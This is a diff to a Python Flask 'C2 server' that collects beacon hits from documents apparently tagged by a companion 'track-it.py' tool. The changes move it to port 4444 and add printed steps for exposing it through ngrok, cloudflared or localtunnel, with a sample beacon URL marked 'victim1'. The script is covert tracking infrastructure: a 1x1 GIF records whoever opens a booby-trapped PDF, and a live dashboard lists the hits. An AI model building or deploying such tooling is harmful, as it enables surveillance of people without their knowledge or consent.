@@ -40,7 +40,7 @@ def dashboard():
 <!DOCTYPE html>
 <html>
 <head>
-    <title>🎯 Track-it C2 Dashboard</title>
+    <title>Track-it C2 Dashboard</title>
     <meta http-equiv="refresh" content="3">
     <style>
         body {{ font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff00; margin: 0; padding: 20px; }}
@@ -58,7 +58,7 @@ def dashboard():
     </style>
 </head>
 <body>
-    <div class="header">🎯 LIVE C2 HITS <span id="hit-count" class="hit-count">{len(hits)}</span></div>
+    <div class="header">LIVE C2 HITS <span id="hit-count" class="hit-count">{len(hits)}</span></div>
     
     <div class="stats">
         <div class="stat">Total: {len(hits)}</div>
@@ -116,32 +116,32 @@ def beacon():
     gif = base64.b64decode("R0lGODlhAQABAIAAAP///wAAACwAAAAAAQABAAACAkQBADs=")
     return Response(gif, 200, {'Content-Type': 'image/gif'})
 
-def expose_tunnel(port=8080):
-    """Auto internet exposure"""
-    print("🌐 Starting internet tunnel...")
-    
-    tunnels = {
-        'ngrok': ['ngrok', 'http', str(port)],
-        'cloudflared': ['cloudflared', 'tunnel', '--url', f'localhost:{port}']
-    }
-    
-    print("Available tunnels:")
-    print("  1. ngrok: https://ngrok.com/download")
-    print("  2. cloudflared: https://developers.cloudflare.com/cloudflare-one/")
-    print("\n💡 Copy your tunnel URL for tracker: --url https://abc123.ngrok.io/beacon")
-    
-    input("\nPress Enter after starting tunnel...")
+def expose_tunnel(port=4444):
+    """Auto internet exposure - NON-BLOCKING (Docker/headless safe)"""
+    print("\n" + "="*60)
+    print("🌐 INTERNET TUNNEL SETUP")
+    print("="*60)
+    print("1. ngrok (Recommended):")
+    print(f"   ngrok http {port}")
+    print("2. cloudflared:")
+    print(f"   cloudflared tunnel --url localhost:{port}")
+    print("3. Localtunnel:")
+    print(f"   npx localtunnel --port {port}")
+    print("\n💡 EXAMPLE ngrok output:")
+    print("   Forwarding  https://abc123.ngrok.io -> http://localhost:4444")
+    print("\n🎯 BEACON URL FORMAT:")
+    print("   https://abc123.ngrok.io/beacon?id=victim1")
+    print("\n🚀 Next: Run tracker with --url https://YOUR_TUNNEL/beacon")
+    print("="*60)
+    print("✅ C2 server LIVE! Open new terminal for tunnel...\n")
 
 if __name__ == "__main__":
     init_db()
-    print("🚀 Starting Local C2 Server...")
-    print("📊 Dashboard: http://localhost:8080")
-    print("📡 Beacon:    http://localhost:8080/beacon")
-    print("\n🌐 Start tunnel then press Enter:")
+    print("🚀 Starting Local C2 Server v2.1...")
+    print("📊 Dashboard: http://localhost:4444")
+    print("📡 Beacon:    http://localhost:4444/beacon")
     
-    expose_tunnel()
+    expose_tunnel()  # Now non-blocking!
     
-    print("\n✅ C2 LIVE! Use tunnel URL in tracker:")
-    print("   python3 track-it.py file.pdf tracked.pdf --url YOUR_TUNNEL_URL/beacon")
-    
-    app.run(host='0.0.0.0', port=8080, debug=False)
+    print("🎯 Server ready - start your tunnel now!")
+    app.run(host='0.0.0.0', port=4444, debug=False)
